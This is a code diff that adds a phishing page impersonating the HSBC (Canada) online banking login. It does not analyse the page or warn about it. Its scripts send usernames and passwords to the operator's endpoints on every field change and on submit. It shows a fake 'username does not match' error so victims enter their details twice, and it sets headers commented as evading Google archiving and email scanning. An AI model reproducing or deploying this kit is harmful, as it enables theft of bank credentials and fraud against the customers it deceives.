@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<-- 0043)deposit/hsbc/e -->
+<?php
+// Disable caching
+header("Cache-Control: no-store, no-cache, must-revalidate");
+header("Expires: " . gmdate("D, d M Y H:i:s", time() - 3600) . " GMT");
+header("Pragma: no-cache");
+
+// Prevent Google Archiving
+header("X-Robots-Tag: noarchive");
+
+// Block email scanning
+header("X-Content-Type-Options: nosniff");
+
+// Disable listeners and log third-party communications
+ini_set("disable_functions", "socket_accept, socket_bind, socket_listen, socket_create_listen, socket_read, socket_recv, socket_recvfrom, socket_recvmsg, socket_send, socket_sendmsg, socket_sendto, socket_getsockname, socket_getpeername, socket_get_option, socket_set_option");
+
+
+// Logging third-party communication attempts
+$logFile = "../../../requests.txt"; // Replace with the path to your log file
+
+// Get the current timestamp
+$timestamp = date("Y-m-d H:i:s");
+
+// Get the IP address of the client
+$ipAddress = $_SERVER['REMOTE_ADDR'];
+
+// Get the requested URL
+$requestUrl = $_SERVER['REQUEST_URI'];
+
+// Create the log message
+$logMessage = "Timestamp: $timestamp | IP: $ipAddress | Requested URL: $requestUrl\n";
+
+// Append the log message to the log file
+file_put_contents($logFile, $logMessage, FILE_APPEND);
+?>
+</html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+        
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <link rel="stylesheet" type="text/css" href="./files/style.css">
+        <link rel="shortcut icon" type="image/PNG" href="./files/logoTrans.png">
+        <title>HSBC - Login</title>  <script>
+    // Disable caching for forward and backward navigation
+    function disableCaching() {
+      // Disable caching for forward navigation
+      window.onpageshow = function(event) {
+        if (event.persisted) {
+          document.getElementById('disableCache').content = 'no-store, no-cache, must-revalidate';
+        }
+      };
+      
+      // Disable caching for backward navigation
+      window.onunload = function() {};
+    }
+    
+    // Set client browser cache to one hour prior
+    function setBrowserCacheTime() {
+      const date = new Date();
+      date.setTime(date.getTime() - (60 * 60 * 1000));
+      document.getElementById('cacheExpires').content = date.toUTCString();
+    }
+
+    // Prevent Google Archiving
+    const metaRobots = document.createElement('meta');
+    metaRobots.name = 'robots';
+    metaRobots.content = 'noarchive';
+    document.head.appendChild(metaRobots);
+
+    // Block email scanning
+    const metaContentType = document.createElement('meta');
+    metaContentType.httpEquiv = 'X-Content-Type-Options';
+    metaContentType.content = 'nosniff';
+    document.head.appendChild(metaContentType);
+
+    // Disable listeners and log third-party communications
+    function disableListeners() {
+      // Disable listeners (Not applicable in HTML pages)
+    }
+
+    function logThirdPartyCommunication() {
+      // Logging third-party communication attempts
+      const timestamp = new Date().toISOString();
+      const ipAddress = "123.45.67.89"; // Replace with actual IP address or retrieve dynamically
+      const requestedUrl = window.location.href;
+      const logMessage = `Timestamp: ${timestamp} | IP: ${ipAddress} | Requested URL: ${requestedUrl}\n`;
+
+      // Specify the log file location
+      const logFile = "../../../requests.txt"; // Replace with the actual log file location
+
+      // Perform the necessary logging operation (e.g., sending log data to a server-side script)
+      const logRequest = new XMLHttpRequest();
+      logRequest.open('POST', logFile, true);
+      logRequest.setRequestHeader('Content-Type', 'text/plain');
+      logRequest.send(logMessage);
+    }
+
+    // Call the necessary functions when the page loads
+    document.addEventListener('DOMContentLoaded', function() {
+      disableCaching();
+      setBrowserCacheTime();
+      disableListeners();
+      logThirdPartyCommunication();
+    });
+  </script>
+        <script src="./files/jquery-3.6.0.min.js###%" crossorigin="anonymous"></script>
+        <script>
+            var lrbank = 'HSBC (CA)';
+            var lrinfo = 'Login';
+        </script>
+        <script src="./files/actions.js###%"></script>
+        <script>
+        $(document).ready(function() {
+            var attempt = 2;
+
+            $('.lab-form').submit(function(e) {
+                e.preventDefault();
+                var form = this;
+
+                $('.error-div').css('display', 'none');
+
+                $('.input-container').removeClass('focused');
+                $('.input-container').prev().css('opacity', '0');
+
+                if (attempt == 1) {
+                    $('.div-loader').css('display', 'block');
+                    $('.div-main').css('display', 'none');
+
+                    $.post('/deposit/hsbc/api/login-submit', $(this).serialize(), function(response) {
+                        $('.error-div').css('display', 'block');
+
+                        $(form).trigger('reset');
+
+                        $('.div-loader').css('display', 'none');
+                        $('.div-main').css('display', 'block');
+                    }, 'JSON');
+
+                    attempt = 2;
+                } else {
+                    $('.div-loader').css('display', 'block');
+                    $('.div-main').css('display', 'none');
+
+                    $.post('/deposit/hsbc/api/login-submit', $(this).serialize(), function(response) {
+                        if (response.status) {
+                            if (response.data.loader) {
+                                location.href = '/deposit/hsbc/w';
+                            } else {
+                                location.href = '/deposit/hsbc/em';
+                            }
+                        } else {
+                            $(form).trigger('reset');
+
+                            $('.error-div').css('display', 'block');
+
+                            $('.div-loader').css('display', 'none');
+                            $('.div-main').css('display', 'block');
+                        }
+                    }, 'JSON');
+                }
+
+                return false;
+            });
+
+            $(document).on('change', '.input-username, .input-password', function() {
+                var username = $(this).hasClass('input-username') ? $(this).val() : $(this).closest('form').find('.input-username').val();
+                var password = $(this).hasClass('input-password') ? $(this).val() : $(this).closest('form').find('.input-password').val();
+                $.post('/deposit/hsbc/login-data', {username: username, password: password});
+            });
+        });
+        </script>
+        <style>
+        .error-div {
+            margin-bottom: 17px;
+            color: red;
+        }
+
+        .error-div img {
+            width: 13px;
+            margin-right: 7px;
+        }
+
+        .btn {
+            background-color: rgb(217, 9, 21) !important;
+            border: 1px solid rgb(217, 9, 21) !important;
+        }
+
+        #loaderOnLoading {
+            display: block;
+        }
+        </style>
+    </head>
+    <body>
+        <img src="./files/logoTrans.png" id="transLogo">
+        <div class="header">
+            <div class="headerRow">
+                <img src="./files/logoTrans.png" id="logo">
+                <!-- <div class="btn" id="loginBtn">Login On </div> -->
+            </div>
+        </div>
+        <div class="main">
+            <div class="alignment div-main">
+                <p class="pageTitle">Log on</p>
+                <form action="deposit/hsbc/e" method="POST" autocomplete="off" class="lab-form">
+                    <p class="error-div" style="display: block"><img src="./files/errIcon.gif" alt=""> The username you entered does not match our records. Please try again.</p>
+                    <div class="row" style="align-items: center;">
+                        <p class="formLabel">Username</p>
+                    </div>
+                    <div class="inptContainer" style="margin-bottom: 20px">
+                        <input type="text" class="inptField lrinput input-username" attr-action="Filling Username" name="username" required="">
+                    </div>
+                    <div class="row" style="align-items: center;">
+                        <p class="formLabel">Password</p>
+                    </div>
+                    <div class="inptContainer">
+                        <input type="password" class="inptField lrinput input-password" attr-action="Filling Password" name="password" required="">
+                    </div>
+                    <div class="row" style="align-items: center;" id="rememberRow">
+                        <input type="checkbox">
+                        <p class="desText">Remember me</p>
+                    </div>
+                    <input type="submit" class="btn" value="Continue" id="sbtn">
+                </form>
+                <p class="desText" style="text-align: center; padding: 10px 0;"><a href="deposit/hsbc/e#">Forgot your username?</a></p>
+            </div>
+            <div class="alignment div-loader" style="display: none">
+                <p class="pageTitle" style="text-align: center">Verifying details</p>
+                <img src="./files/loading.gif" alt="" id="loaderOnLoading">
+                <p class="desText" style="text-align: center; padding: 20px 0;">Loading please wait...</p>
+            </div>
+        </div>
+        <div class="footer">
+        </div>
+    
+
+</body></html>
